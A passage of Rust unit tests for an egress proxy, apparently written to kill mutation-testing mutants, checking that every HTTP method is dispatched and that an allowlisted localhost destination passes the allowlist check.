    /// connection fails (no server), but the error must be
    /// `UpstreamFailed`, not `InvalidSurrogate` (which is what a
    /// deleted match arm produces). Pins the seven arm-deletion
    /// mutants.
    #[test]
    fn forward_dispatches_all_methods() {
        let proxy = test_proxy();
        for method in ["GET", "HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"] {
            let surrogate = proxy.mint_surrogate(1000, "localhost:443", 3600).unwrap();
            let request = EgressRequest {
                method: String::from(method),
                destination: String::from("localhost:443"),
                path: String::from("/"),
                headers: vec![],
                body: vec![],
                surrogate_b64: surrogate,
            };
            let result = proxy.forward(1000, &request);
            assert!(
                !matches!(result, Err(Error::InvalidSurrogate)),
                "method {method:?} should dispatch, not be rejected as invalid"
            );
        }
    }

    /// `forward` passes the allowlist check for allowlisted
    /// destinations. With the `!` deleted, allowlisted destinations
    /// would be rejected with `DestinationDenied`. The upstream
    /// connection fails (no server), but it must not be
    /// `DestinationDenied`.
    #[test]
    fn forward_allows_allowlisted_destination() {
        let proxy = test_proxy();
        let surrogate = proxy.mint_surrogate(1000, "localhost:443", 3600).unwrap();
        let request = EgressRequest {
            method: String::from("GET"),
            destination: String::from("localhost:443"),
            path: String::from("/"),
            headers: vec![],
            body: vec![],
            surrogate_b64: surrogate,
        };
        let result = proxy.forward(1000, &request);
        assert!(
            !matches!(result, Err(Error::DestinationDenied)),
            "allowlisted destination must pass the allowlist check"
        );
    }
}
